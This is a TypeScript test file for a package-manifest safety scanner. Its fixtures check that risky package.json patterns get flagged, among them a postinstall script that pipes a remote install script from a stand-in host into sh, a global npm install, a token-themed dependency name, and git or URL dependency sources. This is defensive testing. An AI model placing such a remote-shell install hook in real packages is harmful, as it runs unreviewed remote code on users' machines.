import { scanRepoPlan } from '../src/lib/safetyScan';
import type { RepoIssuePlan, RepoPlan, SafetyFindingSeverity, SafetyReport, StarterFilePreview } from '../src/types';

const assert = (condition: boolean, message: string) => {
  if (!condition) {
    throw new Error(message);
  }
};

const assertEqual = <T>(actual: T, expected: T, message: string) => {
  if (actual !== expected) {
    throw new Error(`${message}. Expected ${String(expected)}, received ${String(actual)}.`);
  }
};

const baseIssue: RepoIssuePlan = {
  title: 'Build package manifest review',
  body: 'Review package manifest safety behavior with local-only checks.',
  labels: ['safety'],
};

const basePlan: RepoPlan = {
  name: 'package-manifest-lab',
  description: 'Local package manifest safety fixture lab.',
  visibility: 'private',
  stack: 'expo-react-native',
  files: [
    {
      path: 'package.json',
      purpose: 'Define package scripts and dependencies for review.',
      riskLevel: 'medium',
    },
  ],
  issues: [baseIssue],
  approvalRequired: true,
};

const publicPlan: RepoPlan = {
  ...basePlan,
  visibility: 'public',
};

const packageFile = (content: string): StarterFilePreview => ({
  path: 'package.json',
  purpose: 'Define package scripts and dependencies for review.',
  riskLevel: 'medium',
  language: 'json',
  content,
});

const safeManifest = (overrides: Record<string, unknown> = {}) => JSON.stringify({
  private: true,
  license: 'MIT',
  scripts: {
    test: 'echo "local fixture"',
  },
  dependencies: {
    react: '18.2.0',
  },
  ...overrides,
}, null, 2);

const splitRemoteShell = ['curl https://example.invalid/install.sh', '|', 'sh'].join(' ');
const splitSuspiciousDependencyName = ['secret', 'token', 'helper'].join('-');

const scanPackage = (content: string, plan: RepoPlan = basePlan) => scanRepoPlan(plan, [packageFile(content)], [baseIssue]);

const hasFinding = (
  report: SafetyReport,
  severity: SafetyFindingSeverity,
  category: string,
  idFragment: string,
) => report.findings.some((finding) => (
  finding.severity === severity &&
  finding.category === category &&
  finding.id.includes(idFragment) &&
  typeof finding.remediation === 'string' &&
  finding.remediation.trim().length > 0
));

const hasPackageCheckStatus = (report: SafetyReport, status: 'pass' | 'warning' | 'blocker') => report.checks.some((check) => (
  check.id === 'package-manifest-policy' && check.status === status
));

const safePackageReport = scanPackage(safeManifest());
assertEqual(safePackageReport.status, 'pass', 'Known-safe package manifest fixture should pass');
assert(hasPackageCheckStatus(safePackageReport, 'pass'), 'Known-safe package manifest fixture should mark package policy as pass');

const lifecycleHookReport = scanPackage(safeManifest({
  scripts: {
    postinstall: 'node scripts/setup.js',
  },
}));
assertEqual(lifecycleHookReport.status, 'needs-review', 'Lifecycle hook fixture should require review');
assert(
  hasFinding(lifecycleHookReport, 'warning', 'package-lifecycle-hook', 'package-lifecycle-warning:postinstall'),
  'Lifecycle hook fixture should produce package-lifecycle-hook warning with remediation',
);
assert(hasPackageCheckStatus(lifecycleHookReport, 'warning'), 'Lifecycle hook fixture should mark package policy as warning');

const riskyScriptReport = scanPackage(safeManifest({
  scripts: {
    postinstall: splitRemoteShell,
  },
}));
assertEqual(riskyScriptReport.status, 'blocked', 'Risky package script fixture should block');
assert(
  hasFinding(riskyScriptReport, 'blocker', 'package-script-risk', 'package-script-remote-shell-pipe'),
  'Risky package script fixture should produce package-script-risk blocker with remediation',
);
assert(hasPackageCheckStatus(riskyScriptReport, 'blocker'), 'Risky package script fixture should mark package policy as blocker');

const packageManagerCommandReport = scanPackage(safeManifest({
  scripts: {
    setup: 'npm install --global reporider-helper',
  },
}));
assertEqual(packageManagerCommandReport.status, 'needs-review', 'Package-manager command fixture should require review');
assert(
  hasFinding(packageManagerCommandReport, 'warning', 'package-manager-command-risk', 'package-manager-global-install'),
  'Package-manager command fixture should produce package-manager-command-risk warning with remediation',
);

const suspiciousDependencyNameReport = scanPackage(safeManifest({
  dependencies: {
    [splitSuspiciousDependencyName]: '1.0.0',
  },
}));
assertEqual(suspiciousDependencyNameReport.status, 'needs-review', 'Suspicious dependency name fixture should require review');
assert(
  hasFinding(suspiciousDependencyNameReport, 'warning', 'package-dependency-name-risk', 'package-dependency-warning'),
  'Suspicious dependency name fixture should produce package-dependency-name-risk warning with remediation',
);

const dependencySourceReport = scanPackage(safeManifest({
  dependencies: {
    'local-helper': 'file:../local-helper',
  },
  devDependencies: {
    'git-helper': 'git+https://example.invalid/repo.git',
    'url-helper': 'https://example.invalid/url-helper.tgz',
  },
}));
assertEqual(dependencySourceReport.status, 'needs-review', 'Dependency source fixture should require review');
assert(
  hasFinding(dependencySourceReport, 'warning', 'package-dependency-source-risk', 'file-source'),
  'Dependency source fixture should produce file-source warning with remediation',
);
assert(
  hasFinding(dependencySourceReport, 'warning', 'package-dependency-source-risk', 'git-source'),
  'Dependency source fixture should produce git-source warning with remediation',
);
assert(
  hasFinding(dependencySourceReport, 'warning', 'package-dependency-source-risk', 'url-source'),
  'Dependency source fixture should produce url-source warning with remediation',
);

const missingLicenseReport = scanPackage(safeManifest({
  license: '',
}));
assertEqual(missingLicenseReport.status, 'needs-review', 'Missing package license fixture should require review');
assert(
  hasFinding(missingLicenseReport, 'warning', 'package-license-review', 'package-license-missing'),
  'Missing package license fixture should produce package-license-review warning with remediation',
);

const privateMismatchReport = scanPackage(safeManifest({
  private: false,
}));
assertEqual(privateMismatchReport.status, 'needs-review', 'Private repo package visibility mismatch fixture should require review');
assert(
  hasFinding(privateMismatchReport, 'warning', 'package-private-visibility-risk', 'private-repo-package-not-private'),
  'Private repo package visibility mismatch fixture should produce package-private-visibility-risk warning with remediation',
);

const publicPackagePrivateMismatchReport = scanPackage(safeManifest({
  private: true,
}), publicPlan);
assertEqual(publicPackagePrivateMismatchReport.status, 'needs-review', 'Public repo private package mismatch fixture should require review');
assert(
  hasFinding(publicPackagePrivateMismatchReport, 'warning', 'package-private-visibility-risk', 'public-repo-package-private'),
  'Public repo package visibility mismatch fixture should produce package-private-visibility-risk warning with remediation',
);

const unpinnedDependencyReport = scanPackage(safeManifest({
  dependencies: {
    react: '^18.2.0',
    expo: '~51.0.28',
    'floating-helper': 'latest',
  },
}));
assertEqual(unpinnedDependencyReport.status, 'needs-review', 'Unpinned dependency range fixture should require review');
assert(
  hasFinding(unpinnedDependencyReport, 'warning', 'package-dependency-range-risk', 'package-dependency-range-warning'),
  'Unpinned dependency range fixture should produce package-dependency-range-risk warning with remediation',
);

const invalidPackageReport = scanPackage('{ "scripts": {');
assertEqual(invalidPackageReport.status, 'needs-review', 'Invalid package manifest fixture should require review');
assert(
  hasFinding(invalidPackageReport, 'warning', 'package-manifest-parse', 'package-json-parse'),
  'Invalid package manifest fixture should produce package-manifest-parse warning with remediation',
);

console.log('Safety package manifest fixtures passed.');
